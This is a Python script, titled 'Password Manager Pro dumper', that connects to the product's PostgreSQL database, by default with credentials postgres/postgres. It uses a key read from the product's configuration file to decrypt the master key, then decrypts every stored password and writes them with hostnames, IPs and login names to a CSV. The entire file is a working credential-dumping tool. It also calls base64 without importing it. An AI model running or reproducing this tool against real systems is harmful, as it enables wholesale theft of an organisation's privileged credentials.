#!/usr/bin/env python3

import csv
import sys
import argparse

import psycopg2

from decrypter import decrypt


def test_key(connection, key):
    cur = connection.cursor()
    cur.execute("SELECT notesowner FROM Ptrx_NotesInfo WHERE noteid=1;")
    encoded_pmp, *_ = cur.fetchone()
    decrypted_pmp = decrypt(encoded_pmp, key)
    if decrypted_pmp == b'PMP':
        print('Success! You have the correct key!')


def dump_all(connection, key, out_path):
    cur = connection.cursor()
    cur.execute("select notesdescription from Ptrx_NotesInfo where noteid = 1;")
    encrypted_key, *_ = cur.fetchone();
    master_key = decrypt(encrypted_key, key).decode()

    cur.execute(f'''
            select ptrx_account.RESOURCEID,
                   ptrx_resource.RESOURCENAME,
                   ptrx_resource.DOMAINNAME,
                   ptrx_resource.IPADDRESS,
                   ptrx_resource.RESOURCEURL,
                   ptrx_password.DESCRIPTION,
                   ptrx_account.loginname,
                   decryptschar(ptrx_passbasedauthen.PASSWORD, '{master_key}')
            from ptrx_passbasedauthen
            LEFT OUTER JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID
            LEFT OUTER JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID
            LEFT OUTER JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID;''')

    with open(out_path, 'w') as f:
        writer = csv.writer(f)
        writer.writerow(['RESOURCEID', 'RESOURCENAME', 'DOMAINNAME', 'IPADDRESS', 'RESOURCEURL', 'DESCRIPTION', 'LOGINNAME', 'PASSWORD', 'ISBASE64'])
        for row in  cur.fetchall():
            *data, enc_passwd = row
            dec_passwd = decrypt(enc_passwd, key)
            try:
                dec_passwd = dec_passwd.decode()
                is_base64 = False
            except:
                dec_passwd = base64.b64encode(dec_passwd).decode()
                is_base64 = True
            data.append(dec_passwd)
            data.append(is_base64)
            writer.writerow(data)
    print(f'Success! Dump is in {out_path}')
    


def build_connect(args):
    try:
        return psycopg2.connect(host=args.host, port=args.port, user=args.user, password=args.password, dbname=args.dbname)
    except:
        sys.exit('Failed to connect to PostgreSQL')


def cli():
    parser = argparse.ArgumentParser(description='Password Manager Pro dumper')
    parser.add_argument('-k', '--key', required=True,
                        help='PMP key (base64). You can find it in the PMP/conf/pmp_key.conf. Be sure to remove any escape "\\" characters')
    db_args_parser = parser.add_argument_group('Database params')
    db_args_parser.add_argument('--host', default='127.0.0.1', help='PostgreSQL host')
    db_args_parser.add_argument('-p', '--port', default='2345', help='PostgreSQL port')
    db_args_parser.add_argument('-U', '--user', default='postgres', help='PostgreSQL user')
    db_args_parser.add_argument('-P', '--password', default='postgres', help='PostgreSQL password')
    db_args_parser.add_argument('-d', '--dbname', default='PassTrix', help='PostgreSQL PassTrix database')
    db_args_parser.add_argument('-c', '--command', default='dumpall', help='Command to run. "test" for testing the key, "dumpall" - does what it says', choices=['dumpall', 'test'])
    db_args_parser.add_argument('-o', '--out', default='pmp_dump.csv', help='Output file path')

    args = parser.parse_args()
    connection = build_connect(args)   

    try:
        if args.command == 'test':
            test_key(connection, args.key)
        elif args.command == 'dumpall':
            dump_all(connection, args.key, args.out)
    except Exception as e:
        raise e
    finally:
        connection.close()


if __name__ == '__main__':
    cli()
